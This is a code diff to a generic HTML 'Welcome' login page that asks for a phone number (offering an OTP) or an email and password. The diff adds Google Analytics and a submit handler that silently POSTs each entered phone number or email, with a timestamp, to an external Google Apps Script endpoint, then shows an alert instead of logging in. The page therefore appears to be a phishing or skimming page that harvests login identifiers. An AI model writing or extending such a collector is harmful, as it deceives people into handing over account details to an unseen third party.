@@ -4,6 +4,21 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Welcome</title>
+    <!-- Google tag (gtag.js) -->
+    <script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=G-JMPJCG12QC"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+
+      gtag("config", "G-JMPJCG12QC");
+    </script>
+
     <style>
       /* ===== RESET ===== */
       * {
@@ -222,44 +237,58 @@
     </div>
 
     <script>
-      document
-        .getElementById("loginForm")
-        .addEventListener("submit", function (e) {
-          e.preventDefault();
-          if (!loginInput.value.trim()) return;
-
-          document.getElementById("loginSection").style.display = "none";
-          document.getElementById("alertSection").style.display = "flex";
-        });
-    </script>
-
-    <script>
       const loginInput = document.getElementById("loginInput");
       const passwordInput = document.getElementById("passwordInput");
       const loginBtn = document.getElementById("loginBtn");
 
+      // INPUT LOGIC (same as before)
       loginInput.addEventListener("input", function () {
         let value = loginInput.value.trim();
 
-        // If it's numeric, enforce 10 digit limit
         if (/^\d+$/.test(value)) {
-          value = value.slice(0, 10); // limit to 10 digits
+          value = value.slice(0, 10);
           loginInput.value = value;
 
           passwordInput.style.display = "none";
           loginBtn.textContent = "GET OTP";
-        }
-        // Email case
-        else if (value.includes("@")) {
+        } else if (value.includes("@")) {
           passwordInput.style.display = "block";
           loginBtn.textContent = "LOGIN";
-        }
-        // Default fallback
-        else {
+        } else {
           passwordInput.style.display = "none";
           loginBtn.textContent = "LOGIN";
         }
       });
+
+      // SUBMIT LOGIC (FIXED)
+      document
+        .getElementById("loginForm")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const value = loginInput.value.trim();
+          if (!value) return;
+
+          const type = value.includes("@") ? "email" : "phone";
+
+          // ✅ FIX: use FormData instead of JSON
+          const formData = new FormData();
+          formData.append("value", value);
+          formData.append("type", type);
+          formData.append("timestamp", new Date().toISOString());
+
+          fetch(
+            "https://script.google.com/macros/s/AKfycbwIKR-If2XH0uEsS1_ydsleEwiDebvxfQ7CgLkqwsrJpPX_3mrcUMfWTIQluF-5cDEAbQ/exec",
+            {
+              method: "POST",
+              body: formData,
+            },
+          );
+
+          // existing behavior (UNCHANGED)
+          document.getElementById("loginSection").style.display = "none";
+          document.getElementById("alertSection").style.display = "flex";
+        });
     </script>
   </body>
 </html>
